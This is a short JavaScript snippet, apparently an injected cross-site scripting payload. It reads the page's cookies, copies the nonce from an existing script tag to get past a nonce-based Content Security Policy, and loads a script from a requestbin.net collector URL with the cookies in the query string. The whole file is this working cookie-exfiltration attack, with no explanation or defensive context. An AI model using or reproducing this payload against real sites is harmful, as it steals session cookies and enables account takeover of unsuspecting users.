var payload = document.cookie;
var nonce = document.querySelector("script").nonce;

var src = 'http://requestbin.net/r/1ozflha1?exp='+payload;

var s = document.createElement('script')
s.type = 'text/javascript'
s.src = src
s.setAttribute('nonce', nonce)

document.body.appendChild(s);
